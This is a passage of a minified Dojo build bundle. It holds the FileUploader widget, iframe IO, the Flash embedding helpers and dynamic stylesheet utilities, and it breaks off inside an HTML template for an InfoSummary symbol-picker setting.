this.norm.w;this.height=this.norm.h;"flash"==this.uploaderType?(this.over=this.getTempNodeStyle(c,this.baseClass+" "+this.hoverClass,a),this.down=this.getTempNodeStyle(c,this.baseClass+" "+this.activeClass,a),this.dsbl=this.getTempNodeStyle(c,this.baseClass+" "+this.disabledClass,a),this.fhtml={cn:this.getText(c),nr:this.norm,ov:this.over,dn:this.down,ds:this.dsbl}):(this.fhtml={cn:this.getText(c),nr:this.norm},"middle"==this.norm.va&&(this.norm.lh=this.norm.h));this.devMode&&(this.log("classes - base:",
this.baseClass," hover:",this.hoverClass,"active:",this.activeClass),this.log("fhtml:",this.fhtml),this.log("norm:",this.norm),this.log("over:",this.over),this.log("down:",this.down))},setButtonStyle:function(){d.set(this.domNode,{width:this.fhtml.nr.w+"px",height:this.fhtml.nr.h+"px",padding:"0px",lineHeight:"normal",position:"relative"});"html"==this.uploaderType&&"middle"==this.norm.va&&d.set(this.domNode,"lineHeight",this.norm.lh+"px");this.showProgress?(this.progTextNode.innerHTML=this.progressMessage,
d.set(this.progTextNode,{width:this.fhtml.nr.w+"px",height:this.fhtml.nr.h+0+"px",padding:"0px",margin:"0px",left:"0px",lineHeight:this.fhtml.nr.h+0+"px",position:"absolute"}),d.set(this.progNode,{width:this.fhtml.nr.w+"px",height:this.fhtml.nr.h+0+"px",padding:"0px",margin:"0px",left:"0px",position:"absolute",display:"none",backgroundImage:"url("+this.progressBackgroundUrl+")",backgroundPosition:"bottom",backgroundRepeat:"repeat-x",backgroundColor:this.progressBackgroundColor})):A.destroy(this.progNode);
d.set(this.insideNode,{position:"absolute",top:"0px",left:"0px",display:""});w.add(this.domNode,this.srcNodeRef.className);-1<this.fhtml.nr.d.indexOf("inline")&&w.add(this.domNode,"dijitInline");try{this.insideNode.innerHTML=this.fhtml.cn}catch(a){if("flash"==this.uploaderType){this.insideNode=this.insideNode.parentNode.removeChild(this.insideNode);e.body().appendChild(this.insideNode);this.insideNode.innerHTML=this.fhtml.cn;var c=h.connect(this,"onReady",this,function(){h.disconnect(c);this.insideNode=
this.insideNode.parentNode.removeChild(this.insideNode);this.domNode.appendChild(this.insideNode)})}else this.insideNode.appendChild(document.createTextNode(this.fhtml.cn))}this._hiddenNode&&d.set(this._hiddenNode,"display","none")},onChange:function(c){},onProgress:function(c){},onComplete:function(c){},onCancel:function(){},onError:function(c){},onReady:function(c){},onLoad:function(c){},submit:function(c){c=c?u.toObject(c):null;this.upload(c);return!1},upload:function(c){if(!this.fileList.length)return!1;
if(!this.uploadUrl)return console.warn("uploadUrl not provided. Aborting."),!1;this.showProgress||this.set("disabled",!0);if(this.progressWidgetId){var a=B.byId(this.progressWidgetId).domNode;"none"==d.get(a,"display")&&(this.restoreProgDisplay="none",d.set(a,"display","block"));"hidden"==d.get(a,"visibility")&&(this.restoreProgDisplay="hidden",d.set(a,"visibility","visible"))}c&&!c.target&&(this.postData=c);this.log("upload type:",this.uploaderType," - postData:",this.postData);for(c=0;c<this.fileList.length;c++)a=
this.fileList[c],a.bytesLoaded=0,a.bytesTotal=a.size||1E5,a.percent=0;"flash"==this.uploaderType?this.uploadFlash():this.uploadHTML();return!1},removeFile:function(c,a){var f;for(f=0;f<this.fileList.length;f++)if(this.fileList[f].name==c){a||this.fileList.splice(f,1);break}"flash"==this.uploaderType?this.flashMovie.removeFile(c):a||(A.destroy(this.fileInputs[f]),this.fileInputs.splice(f,1),this._renumberInputs());this.fileListId&&A.destroy("file_"+c)},destroy:function(){"flash"!=this.uploaderType||
this.flashMovie?(v.forEach(this._subs,h.unsubscribe,dojo),v.forEach(this._cons,h.disconnect,dojo),this.scrollConnect&&h.disconnect(this.scrollConnect),"flash"==this.uploaderType?(this.flashObject.destroy(),delete this.flashObject):(A.destroy(this._fileInput),A.destroy(this._formNode)),this.inherited(arguments)):this._cons.push(h.connect(this,"onLoad",this,"destroy"))},_displayProgress:function(c){!0===c?("flash"==this.uploaderType?d.set(this.insideNode,"top","-2500px"):d.set(this.insideNode,"display",
"none"),d.set(this.progNode,"display","")):!1===c?(d.set(this.insideNode,{display:"",top:"0"}),d.set(this.progNode,"display","none")):d.set(this.progNode,"width",c*this.fhtml.nr.w+"px")},_animateProgress:function(){this._displayProgress(!0);var c=!1,a=h.connect(this,"_complete",function(){h.disconnect(a);c=!0}),f=0,b=setInterval(n.hitch(this,function(){f+=5;f>this.fhtml.nr.w&&(f=0,c=!0);this._displayProgress(f/this.fhtml.nr.w);c&&(clearInterval(b),setTimeout(n.hitch(this,function(){this._displayProgress(!1)}),
500))}),50)},_error:function(c){"string"==typeof c&&(c=Error(c));this.onError(c)},_addToFileList:function(){if(this.fileListId){var c="";v.forEach(this.fileList,function(a){c+='\x3ctable id\x3d"file_'+a.name+'" class\x3d"fileToUpload"\x3e\x3ctr\x3e\x3ctd class\x3d"fileToUploadClose"\x3e\x3c/td\x3e\x3ctd class\x3d"fileToUploadName"\x3e'+a.name+'\x3c/td\x3e\x3ctd class\x3d"fileToUploadSize"\x3e'+(a.size?Math.ceil(.001*a.size)+"kb":"")+"\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e"},this);b.byId(this.fileListId).innerHTML=
c}},_change:function(c){p("ie")&&v.forEach(c,function(a){a.name=a.name.split("\\")[a.name.split("\\").length-1]});this.selectMultipleFiles?this.fileList=this.fileList.concat(c):(this.fileList[0]&&this.removeFile(this.fileList[0].name,!0),this.fileList=c);this._addToFileList();this.onChange(c);this.uploadOnChange?("html"==this.uploaderType&&this._buildFileInput(),this.upload()):"html"==this.uploaderType&&this.selectMultipleFiles&&(this._buildFileInput(),this._connectInput())},_complete:function(c){c=
n.isArray(c)?c:[c];v.forEach(c,function(a){a.ERROR&&this._error(a.ERROR)},this);v.forEach(this.fileList,function(a){a.bytesLoaded=1;a.bytesTotal=1;a.percent=100;this._progress(a)},this);v.forEach(this.fileList,function(a){this.removeFile(a.name,!0)},this);this.onComplete(c);this.fileList=[];this._resetHTML();this.set("disabled",!1);this.restoreProgDisplay&&setTimeout(n.hitch(this,function(){d.set(B.byId(this.progressWidgetId).domNode,"none"==this.restoreProgDisplay?"display":"visibility",this.restoreProgDisplay)}),
500)},_progress:function(c){for(var a=0,f=0,b=0;b<this.fileList.length;b++){var g=this.fileList[b];g.name==c.name&&(g.bytesLoaded=c.bytesLoaded,g.bytesTotal=c.bytesTotal,g.percent=Math.ceil(g.bytesLoaded/g.bytesTotal*100),this.log(g.name,"percent:",g.percent));f+=Math.ceil(.001*g.bytesLoaded);a+=Math.ceil(.001*g.bytesTotal)}c=Math.ceil(f/a*100);this.progressWidgetId&&B.byId(this.progressWidgetId).update({progress:c+"%"});this.showProgress&&this._displayProgress(.01*c);this.onProgress(this.fileList)},
_getDisabledAttr:function(){return this._disabled},_setDisabledAttr:function(c){if(this._disabled!=c){if("flash"==this.uploaderType){if(!this.flashReady){var a=h.connect(this,"onLoad",this,function(){h.disconnect(a);this._setDisabledAttr(c)});return}this._disabled=c;this.flashMovie.doDisable(c)}else this._disabled=c,d.set(this._fileInput,"display",this._disabled?"none":"");w.toggle(this.domNode,this.disabledClass,c)}},_onFlashBlur:function(){this.flashMovie.blur();if(!this.nextFocusObject&&this.tabIndex)for(var c=
q("[tabIndex]"),a=0;a<c.length;a++)if(c[a].tabIndex>=Number(this.tabIndex)+1){this.nextFocusObject=c[a];break}this.nextFocusObject.focus()},_disconnect:function(){v.forEach(this._cons,h.disconnect,dojo)},uploadHTML:function(){this.selectMultipleFiles&&A.destroy(this._fileInput);this._setHtmlPostData();this.showProgress&&this._animateProgress();J.send({url:this.uploadUrl.toString(),form:this._formNode,handleAs:"json",error:n.hitch(this,function(c){this._error("HTML Upload Error:"+c.message)}),load:n.hitch(this,
function(c,a,f){this._complete(c)})})},createHtmlUploader:function(){this._buildForm();this._setFormStyle();this._buildFileInput();this._connectInput();this._styleContent();d.set(this.insideNode,"visibility","visible");this.onReady()},_connectInput:function(){this._disconnect();this._cons.push(h.connect(this._fileInput,"mouseover",this,function(c){w.add(this.domNode,this.hoverClass);this.onMouseOver(c)}));this._cons.push(h.connect(this._fileInput,"mouseout",this,function(c){setTimeout(n.hitch(this,
function(){w.remove(this.domNode,this.activeClass);w.remove(this.domNode,this.hoverClass);this.onMouseOut(c);this._checkHtmlCancel("off")}),0)}));this._cons.push(h.connect(this._fileInput,"mousedown",this,function(c){w.add(this.domNode,this.activeClass);w.remove(this.domNode,this.hoverClass);this.onMouseDown(c)}));this._cons.push(h.connect(this._fileInput,"mouseup",this,function(c){w.remove(this.domNode,this.activeClass);this.onMouseUp(c);this.onClick(c);this._checkHtmlCancel("up")}));this._cons.push(h.connect(this._fileInput,
"change",this,function(){this._checkHtmlCancel("change");var c=this._fileInput.value;c?this._change([{name:c,type:"",size:0}]):this._change([])}));0<=this.tabIndex&&z.set(this.domNode,"tabIndex",this.tabIndex)},_checkHtmlCancel:function(c){"change"==c&&(this.dialogIsOpen=!1);"up"==c&&(this.dialogIsOpen=!0);if("off"==c){if(this.dialogIsOpen)this.onCancel();this.dialogIsOpen=!1}},_styleContent:function(){var c=this.fhtml.nr;d.set(this.insideNode,{width:c.w+"px",height:"middle"==c.va?c.h+"px":"auto",
textAlign:c.ta,paddingTop:c.p[0]+"px",paddingRight:c.p[1]+"px",paddingBottom:c.p[2]+"px",paddingLeft:c.p[3]+"px"});try{d.set(this.insideNode,"lineHeight","inherit")}catch(a){}},_resetHTML:function(){"html"==this.uploaderType&&this._formNode&&(this.fileInputs=[],q("*",this._formNode).forEach(function(c){A.destroy(c)}),this.fileCount=0,this._buildFileInput(),this._connectInput())},_buildForm:function(){this._formNode||(9>p("ie")||p("ie")&&p("quirks")?(this._formNode=document.createElement('\x3cform enctype\x3d"multipart/form-data" method\x3d"post"\x3e'),
this._formNode.encoding="multipart/form-data",this._formNode.id=B.getUniqueId("FileUploaderForm"),this.domNode.appendChild(this._formNode)):this._formNode=A.create("form",{enctype:"multipart/form-data",method:"post",id:B.getUniqueId("FileUploaderForm")},this.domNode))},_buildFileInput:function(){this._fileInput&&(this._disconnect(),this._fileInput.id+=this.fileCount,d.set(this._fileInput,"display","none"));this._fileInput=document.createElement("input");this.fileInputs.push(this._fileInput);var c=
this.htmlFieldName;this.selectMultipleFiles&&(c+=this.fileCount,this.fileCount++);z.set(this._fileInput,{id:this.id,name:c,type:"file"});w.add(this._fileInput,"dijitFileInputReal");this._formNode.appendChild(this._fileInput);c=m.getMarginBox(this._fileInput);d.set(this._fileInput,{position:"relative",left:this.fhtml.nr.w-c.w+"px",opacity:0})},_renumberInputs:function(){if(this.selectMultipleFiles){var c;this.fileCount=0;v.forEach(this.fileInputs,function(a){c=this.htmlFieldName+this.fileCount;this.fileCount++;
z.set(a,"name",c)},this)}},_setFormStyle:function(){G.insertCssRule("#"+this._formNode.id+" input","font-size:"+Math.max(2,Math.max(Math.ceil(this.fhtml.nr.w/60),Math.ceil(this.fhtml.nr.h/15)))+"em");d.set(this.domNode,{overflow:"hidden",position:"relative"});d.set(this.insideNode,"position","absolute")},_setHtmlPostData:function(){if(this.postData)for(var c in this.postData)A.create("input",{type:"hidden",name:c,value:this.postData[c]},this._formNode)},uploadFlash:function(){try{if(this.showProgress){this._displayProgress(!0);
var c=h.connect(this,"_complete",this,function(){h.disconnect(c);this._displayProgress(!1)})}var a={},f;for(f in this.postData)a[f]=this.postData[f];this.flashMovie.doUpload(a)}catch(t){this._error("FileUploader - Sorry, the SWF failed to initialize."+t)}},createFlashUploader:function(){if(this.uploadUrl=this.uploadUrl.toString())if(0>this.uploadUrl.toLowerCase().indexOf("http")&&0!=this.uploadUrl.indexOf("/")){var c=window.location.href.split("/");c.pop();c=c.join("/")+"/";this.uploadUrl=c+this.uploadUrl;
this.log("SWF Fixed - Relative loc:",c," abs loc:",this.uploadUrl)}else this.log("SWF URL unmodified:",this.uploadUrl);else console.warn("Warning: no uploadUrl provided.");c={expressInstall:!0,path:this.swfPath.uri||this.swfPath,width:this.fhtml.nr.w,height:this.fhtml.nr.h,allowScriptAccess:"always",allowNetworking:"all",vars:{uploadDataFieldName:this.flashFieldName,uploadUrl:this.uploadUrl,uploadOnSelect:this.uploadOnChange,deferredUploading:this.deferredUploading||0,selectMultipleFiles:this.selectMultipleFiles,
id:this.id,isDebug:this.isDebug,devMode:this.devMode,flashButton:k.serialize("fh",this.fhtml),fileMask:k.serialize("fm",this.fileMask),noReturnCheck:this.skipServerCheck,serverTimeout:this.serverTimeout},params:{scale:"noscale",wmode:"opaque",allowScriptAccess:"always",allowNetworking:"all"}};this.flashObject=new C(c,this.insideNode);this.flashObject.onError=n.hitch(function(a){this._error("Flash Error: "+a)});this.flashObject.onReady=n.hitch(this,function(){d.set(this.insideNode,"visibility","visible");
this.log("FileUploader flash object ready");this.onReady(this)});this.flashObject.onLoad=n.hitch(this,function(a){this.flashMovie=a;this.flashReady=!0;this.onLoad(this)});this._connectFlash()},_connectFlash:function(){this._doSub("/filesSelected","_change");this._doSub("/filesUploaded","_complete");this._doSub("/filesProgress","_progress");this._doSub("/filesError","_error");this._doSub("/filesCanceled","onCancel");this._doSub("/stageBlur","_onFlashBlur");this._doSub("/up","onMouseUp");this._doSub("/down",
"onMouseDown");this._doSub("/over","onMouseOver");this._doSub("/out","onMouseOut");this.connect(this.domNode,"focus",function(){this.flashMovie.focus();this.flashMovie.doFocus()});0<=this.tabIndex&&z.set(this.domNode,"tabIndex",this.tabIndex)},_doSub:function(c,a){this._subs.push(h.subscribe(this.id+c,this,a))},urlencode:function(c){return c&&"none"!=c?c.replace(/:/g,"||").replace(/\./g,"^^").replace("url(","").replace(")","").replace(/'/g,"").replace(/"/g,""):!1},isButton:function(c){c=c.tagName.toLowerCase();
return"button"==c||"input"==c},getTextStyle:function(c){var a={};a.ff=d.get(c,"fontFamily");if(a.ff){a.ff=a.ff.replace(", ",",");a.ff=a.ff.replace(/\"|\'/g,"");a.ff="sans-serif"==a.ff?"Arial":a.ff;a.fw=d.get(c,"fontWeight");a.fi=d.get(c,"fontStyle");a.fs=parseInt(d.get(c,"fontSize"),10);if(-1<d.get(c,"fontSize").indexOf("%"))for(var f=c;f.tagName;){if(-1==d.get(f,"fontSize").indexOf("%")){a.fs=parseInt(d.get(f,"fontSize"),10);break}"body"==f.tagName.toLowerCase()&&(a.fs=.16*parseInt(d.get(f,"fontSize"),
10));f=f.parentNode}a.fc=(new E(d.get(c,"color"))).toHex();a.fc=parseInt(a.fc.substring(1,Infinity),16)}a.lh=d.get(c,"lineHeight");a.ta=d.get(c,"textAlign");a.ta="start"!=a.ta&&a.ta?a.ta:"left";a.va=this.isButton(c)?"middle":a.lh==a.h?"middle":d.get(c,"verticalAlign");return a},getText:function(c){c=n.trim(c.innerHTML);-1<c.indexOf("\x3c")&&(c=escape(c));return c},getStyle:function(c){var a={},f=m.getContentBox(c),b=m.getPadExtents(c);a.p=[b.t,b.w-b.l,b.h-b.t,b.l];a.w=f.w+b.w;a.h=f.h+b.h;a.d=d.get(c,
"display");f=new E(d.get(c,"backgroundColor"));a.bc=0==f.a?"#ffffff":f.toHex();a.bc=parseInt(a.bc.substring(1,Infinity),16);if(f=this.urlencode(d.get(c,"backgroundImage")))a.bi={url:f,rp:d.get(c,"backgroundRepeat"),pos:escape(d.get(c,"backgroundPosition"))},a.bi.pos||(f=d.get(c,"backgroundPositionX"),b=d.get(c,"backgroundPositionY"),a.bi.pos=escape(("left"==f?"0%":"right"==f?"100%":f)+" "+("top"==b?"0%":"bottom"==b?"100%":b)));return n.mixin(a,this.getTextStyle(c))},getTempNodeStyle:function(c,a,
f){if(f){f=A.place("\x3c"+c.tagName+"\x3e\x3cspan\x3e"+c.innerHTML+"\x3c/span\x3e\x3c/"+c.tagName+"\x3e",c.parentNode);var b=f.firstChild;w.add(b,c.className);w.add(f,a);c=this.getStyle(b)}else f=A.place("\x3c"+c.tagName+"\x3e"+c.innerHTML+"\x3c/"+c.tagName+"\x3e",c.parentNode),w.add(f,c.className),w.add(f,a),f.id=c.id,c=this.getStyle(f);A.destroy(f);return c}})})},"dojo/io/iframe":function(){define("../_base/config ../_base/json ../_base/kernel ../_base/lang ../_base/xhr ../sniff ../_base/window ../dom ../dom-construct ../query require ../aspect ../request/iframe".split(" "),
function(l,x,n,v,h,e,p,q,b,d,m,z,w){n.deprecated("dojo/io/iframe","Use dojo/request/iframe.","2.0");e=w._iframeName;e=e.substring(0,e.lastIndexOf("_"));var A=v.delegate(w,{create:function(){return A._frame=w.create.apply(w,arguments)},get:null,post:null,send:function(b){var g,d=h._ioSetArgs(b,function(b){g&&g.cancel()},function(b){var d=null;b=b.ioArgs;try{var e=b.handleAs;"xml"===e||"html"===e?d=g.response.data:(d=g.response.text,"json"===e?d=x.fromJson(d):"javascript"===e&&(d=n.eval(d)))}catch(k){d=
k}return d},function(b,g){g.ioArgs._hasError=!0;return b}),e=d.ioArgs,m="GET",p=q.byId(b.form);b.method&&"POST"===b.method.toUpperCase()&&p&&(m="POST");b={method:m,handleAs:"json"===b.handleAs||"javascript"===b.handleAs?"text":b.handleAs,form:b.form,query:p?null:b.content,data:p?b.content:null,timeout:b.timeout,ioArgs:e};b.method&&(b.method=b.method.toUpperCase());if(l.ioPublish&&n.publish&&!1!==e.args.ioPublish)var u=z.after(w,"_notifyStart",function(b){b.options.ioArgs===e&&(u.remove(),h._ioNotifyStart(d))},
!0);g=w(e.url,b,!0);e._callNext=g._callNext;g.then(function(){d.resolve(d)}).otherwise(function(b){d.ioArgs.error=b;d.reject(b)});return d},_iframeOnload:p.global[e+"_onload"]});v.setObject("dojo.io.iframe",A);return A})},"dojox/embed/Flash":function(){define("dojo/_base/lang dojo/_base/unload dojo/_base/array dojo/query dojo/has dojo/dom dojo/on dojo/window dojo/string".split(" "),function(l,x,n,v,h,e,p,q,b){function d(b){b=l.delegate(A,b);if(!("path"in b))return console.error("dojox.embed.Flash(ctor):: no path reference to a Flash movie was provided."),
null;"id"in b||(b.id="dojox-embed-flash-"+w++);return b}var m,z,w=0,A={expressInstall:!1,width:320,height:240,swLiveConnect:"true",allowScriptAccess:"sameDomain",allowNetworking:"all",style:null,redirect:null};h("ie")?(m=function(g){g=d(g);if(!g)return null;var e,h=g.path;if(g.vars){var m=[];for(e in g.vars)m.push(encodeURIComponent(e)+"\x3d"+encodeURIComponent(g.vars[e]));g.params.FlashVars=m.join("\x26");delete g.vars}h='\x3cobject id\x3d"'+b.escape(String(g.id))+'" classid\x3d"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width\x3d"'+
b.escape(String(g.width))+'" height\x3d"'+b.escape(String(g.height))+'"'+(g.style?' style\x3d"'+b.escape(String(g.style))+'"':"")+'\x3e\x3cparam name\x3d"movie" value\x3d"'+b.escape(String(h))+'" /\x3e';if(g.params)for(e in g.params)h+='\x3cparam name\x3d"'+b.escape(e)+'" value\x3d"'+b.escape(String(g.params[e]))+'" /\x3e';return{id:g.id,markup:h+"\x3c/object\x3e"}},z=function(){for(var b=10,d=null;!d&&7<b;)try{d=new ActiveXObject("ShockwaveFlash.ShockwaveFlash."+b--)}catch(J){}return d?(b=d.GetVariable("$version").split(" ")[1].split(","),
{major:null!=b[0]?parseInt(b[0]):0,minor:null!=b[1]?parseInt(b[1]):0,rev:null!=b[2]?parseInt(b[2]):0}):{major:0,minor:0,rev:0}}(),x.addOnWindowUnload(function(){console.warn("***************UNLOAD");var b=function(){};v("object").reverse().style("display","none").forEach(function(g){for(var d in g)if("FlashVars"!=d&&"function"==typeof g[d])try{g[d]=b}catch(E){}})})):(m=function(g){g=d(g);if(!g)return null;var e,h=g.path;if(g.vars){var m=[];for(e in g.vars)m.push(encodeURIComponent(e)+"\x3d"+encodeURIComponent(g.vars[e]));
g.params.flashVars=m.join("\x26");delete g.vars}h='\x3cembed type\x3d"application/x-shockwave-flash" src\x3d"'+b.escape(String(h))+'" id\x3d"'+b.escape(String(g.id))+'" width\x3d"'+b.escape(String(g.width))+'" height\x3d"'+b.escape(String(g.height))+'"'+(g.style?' style\x3d"'+b.escape(String(g.style))+'" ':"")+'pluginspage\x3d"'+window.location.protocol+'//www.adobe.com/go/getflashplayer" ';if(g.params)for(e in g.params)h+=" "+b.escape(e)+'\x3d"'+b.escape(String(g.params[e]))+'"';return{id:g.id,markup:h+
" /\x3e"}},z=function(){var b=navigator.plugins["Shockwave Flash"];return b&&b.description?(b=b.description.replace(/([a-zA-Z]|\s)+/,"").replace(/(\s+r|\s+b[0-9]+)/,".").split("."),{major:null!=b[0]?parseInt(b[0]):0,minor:null!=b[1]?parseInt(b[1]):0,rev:null!=b[2]?parseInt(b[2]):0}):{major:0,minor:0,rev:0}}());var u=function(b,d){if(-1<location.href.toLowerCase().indexOf("file://"))throw Error("dojox.embed.Flash can't be run directly from a file. To instatiate the required SWF correctly it must be run from a server, like localHost.");
this.available=z.major;this.minimumVersion=b.minimumVersion||9;this.domNode=this.movie=this.id=null;d&&(d=e.byId(d));setTimeout(l.hitch(this,function(){if(b.expressInstall||this.available&&this.available>=this.minimumVersion)if(b&&d)this.init(b,d);else this.onError("embed.Flash was not provided with the proper arguments.");else if(this.available)this.onError("Flash version detected: "+this.available+" is out of date. Minimum required: "+this.minimumVersion);else this.onError("Flash is not installed.")}),
100)};l.extend(u,{onReady:function(b){},onLoad:function(b){},onError:function(b){},_onload:function(){clearInterval(this._poller);delete this._poller;delete this._pollCount;delete this._pollMax;this.onLoad(this.movie)},init:function(b,d){this.destroy();d=e.byId(d||this.domNode);if(!d)throw Error("dojox.embed.Flash: no domNode reference has been passed.");var g=0;this._poller=null;this._pollCount=0;this._pollMax=15;this.pollTime=100;u.initialized&&(this.id=u.place(b,d),this.domNode=d,setTimeout(l.hitch(this,
function(){this.movie=this.byId(this.id,b.doc);this.onReady(this.movie);this._poller=setInterval(l.hitch(this,function(){try{g=this.movie.PercentLoaded()}catch(E){console.warn("this.movie.PercentLoaded() failed",E,this.movie)}if(100==g)this._onload();else if(0==g&&this._pollCount++>this._pollMax)throw clearInterval(this._poller),Error("Building SWF failed.");}),this.pollTime)}),1))},_destroy:function(){try{this.domNode.removeChild(this.movie)}catch(g){}this.id=this.movie=this.domNode=null},destroy:function(){if(this.movie){var b=
l.delegate({id:!0,movie:!0,domNode:!0,onReady:!0,onLoad:!0}),d;for(d in this)b[d]||delete this[d];this._poller?p(this,"Load",this,"_destroy"):this._destroy()}},byId:function(b,d){d=d||document;return d.embeds[b]?d.embeds[b]:d[b]?d[b]:window[b]?window[b]:document[b]?document[b]:null}});l.mixin(u,{minSupported:8,available:z.major,supported:z.major>=z.required,minimumRequired:z.required,version:z,initialized:!1,onInitialize:function(){u.initialized=!0},__ie_markup__:function(b){return m(b)},proxy:function(b,
d){n.forEach(d instanceof Array?d:[d],function(b){this[b]=l.hitch(this,function(){return function(){return eval(this.movie.CallFunction('\x3cinvoke name\x3d"'+b+'" returntype\x3d"javascript"\x3e\x3carguments\x3e'+n.map(arguments,function(b){return __flash__toXML(b)}).join("")+"\x3c/arguments\x3e\x3c/invoke\x3e"))}.apply(this,arguments||[])})},b)}});u.place=function(b,d){b=m(b);d=e.byId(d);d||(d=q.doc.createElement("div"),d.id=b.id+"-container",q.body().appendChild(d));return b?(d.innerHTML=b.markup,
b.id):null};u.onInitialize();l.setObject("dojox.embed.Flash",u);return u})},"dojox/embed/flashVars":function(){define(["dojo"],function(l){l.deprecated("dojox.embed.flashVars","Will be removed in 2.0","2.0");var x={serialize:function(n,v){var h=function(b){"string"==typeof b&&(b=b.replace(/;/g,"_sc_"),b=b.replace(/\./g,"_pr_"),b=b.replace(/\:/g,"_cl_"));return b},e=dojox.embed.flashVars.serialize,p="";if(l.isArray(v)){for(var q=0;q<v.length;q++)p+=e(n+"."+q,h(v[q]))+";";return p.replace(/;{2,}/g,
";")}if(l.isObject(v)){for(q in v)p+=e(n+"."+q,h(v[q]))+";";return p.replace(/;{2,}/g,";")}return n+":"+v}};l.setObject("dojox.embed.flashVars",x);return x})},"dojox/html/styles":function(){define(["dojo/_base/lang","dojo/_base/array","dojo/_base/window","dojo/_base/sniff"],function(l,x,n,v){var h=l.getObject("dojox.html",!0),e={},p={},q=[];h.insertCssRule=function(b,d,e){e=h.getDynamicStyleSheet(e);var m=b+" {"+d+"}";console.log("insertRule:",m);v("ie")?(e.cssText+=m,console.log("ss.cssText:",e.cssText)):
e.sheet?e.sheet.insertRule(m,e._indicies.length):e.appendChild(n.doc.createTextNode(m));e._indicies.push(b+" "+d);return b};h.removeCssRule=function(b,d,h){var m,l=-1,p,n;for(p in e)if(!h||h===p){m=e[p];for(n=0;n<m._indicies.length;n++)if(b+" "+d===m._indicies[n]){l=n;break}if(-1<l)break}if(!m)return console.warn("No dynamic style sheet has been created from which to remove a rule."),!1;if(-1===l)return console.warn("The css rule was not found and could not be removed."),!1;m._indicies.splice(l,1);
v("ie")?m.removeRule(l):m.sheet&&m.sheet.deleteRule(l);return!0};h.modifyCssRule=function(b,d,e){};h.getStyleSheet=function(b){if(e[b||"default"])return e[b||"default"];if(!b)return!1;var d=h.getStyleSheets();if(d[b])return h.getStyleSheets()[b];for(var m in d)if(d[m].href&&-1<d[m].href.indexOf(b))return d[m];return!1};h.getDynamicStyleSheet=function(b){b||(b="default");e[b]||(n.doc.createStyleSheet?(e[b]=n.doc.createStyleSheet(),9>v("ie")&&(e[b].title=b)):(e[b]=n.doc.createElement("style"),e[b].setAttribute("type",
"text/css"),n.doc.getElementsByTagName("head")[0].appendChild(e[b]),console.log(b," ss created: ",e[b].sheet)),e[b]._indicies=[]);return e[b]};h.enableStyleSheet=function(b){if(b=h.getStyleSheet(b))b.sheet?b.sheet.disabled=!1:b.disabled=!1};h.disableStyleSheet=function(b){if(b=h.getStyleSheet(b))b.sheet?b.sheet.disabled=!0:b.disabled=!0};h.activeStyleSheet=function(b){var d=h.getToggledStyleSheets(),e;if(1===arguments.length)x.forEach(d,function(d){d.disabled=d.title===b?!1:!0});else for(e=0;e<d.length;e++)if(!1===
d[e].disabled)return d[e];return!0};h.getPreferredStyleSheet=function(){};h.getToggledStyleSheets=function(){var b;if(!q.length){var d=h.getStyleSheets();for(b in d)d[b].title&&q.push(d[b])}return q};h.getStyleSheets=function(){if(p.collected)return p;x.forEach(n.doc.styleSheets,function(b){var d=b.sheet?b.sheet:b;b=d.title||d.href;if(v("ie"))-1===d.cssText.indexOf("#default#VML")&&(d.href?p[b]=d:d.imports.length?x.forEach(d.imports,function(b){p[b.title||b.href]=b}):p[b]=d);else{p[b]=d;p[b].id=d.ownerNode.id;
b=[];try{b=d[d.cssRules?"cssRules":"rules"]}catch(m){console.warn("Reading css rules from stylesheet "+d.href+" is forbidden due to same-origin policy. See http://www.w3.org/TR/CSP/#cascading-style-sheet-css-parsing",d)}x.forEach(b,function(b){b.href&&(p[b.href]=b.styleSheet,p[b.href].id=d.ownerNode.id)})}});p.collected=!0;return p};return h})},"widgets/InfoSummary/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],
function(){})},"url:widgets/InfoSummary/setting/MySymbolPicker.html":'\x3cdiv style\x3d"width: 100%;"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"tabParent"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"symbolPickerContainer" class\x3d"symbolPickerContainer"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"div_symbolOptionsContainer" class\x3d"symbolOptionsContainer"\x3e\r\n        \x3cdiv class\x3d"label iconOptionsText"\x3e\r\n          ${nls.symbolOptionsText}\r\n        \x3c/div\x3e\r\n        \x3chr /\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"div_symbolOptions" class\x3d"symbolOptions"\x3e\r\n          \x3c!--Symbol Options--\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10"\r\n               data-dojo-attach-point\x3d"grpSymbolOptions"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"div_rdoLayerSym" class\x3d"height30"\x3e\r\n              \x3cinput name\x3d"a" data-dojo-type\x3d"dijit/form/RadioButton"\r\n                     data-dojo-attach-point\x3d"rdoLayerSym"\r\n                     data-dojo-attach-event\x3d"onChange:_rdoLayerSymChanged"\r\n                     title\x3d"${nls.rdoLayer}" /\x3e\r\n              \x3cspan class\x3d"label"\x3e${nls.rdoLayer}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"jimu-r-row symPick marginLR20" data-dojo-attach-point\x3d"layerSym"\x3e \x3c/div\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpSymbolOptions"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"div_rdoEsriSym" class\x3d"height30"\x3e\r\n              \x3cinput name\x3d"a" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoEsriSym" data-dojo-attach-event\x3d"onChange:_rdoEsriSymChanged" title\x3d"${nls.rdoEsri}" /\x3e\r\n              \x3cspan class\x3d"label"\x3e${nls.rdoEsri}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"symbolPicker" data-dojo-type\x3d"jimu/dijit/SymbolPicker" class\x3d"jimu-r-row symPick marginLR20"\x3e\x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"parent_div_uploadCustomSymbol"\x3e\r\n            \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpSymbolOptions"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"div_rdoCustomSym" class\x3d"rdoCustomSym"\x3e\r\n                \x3cinput name\x3d"a" 